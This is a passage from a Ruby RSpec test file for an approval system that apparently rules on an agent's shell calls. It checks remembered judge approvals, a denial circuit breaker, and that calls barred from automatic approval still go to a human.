      ruled(remembering(scripted, denials: breaker), make)
      ruled(remembering(scripted, denials: breaker), bash("make docs"))

      expect(breaker.tripped?("main")).to be(false)
    end

    it "still holds a barred call from the judge, remembered or not" do
      scripted = answering("approve")
      ruled(remembering(scripted), bash)

      ruled(remembering(scripted), bash, within: context.with(automatic_approval_barred: true)) do |pending|
        pending.deny(surface: "human_spec")
      end

      expect(escalations.last).not_to include("reason" => described_class::REMEMBERED)
      expect(scripted.prompts.size).to eq(1)
    end
  end
end
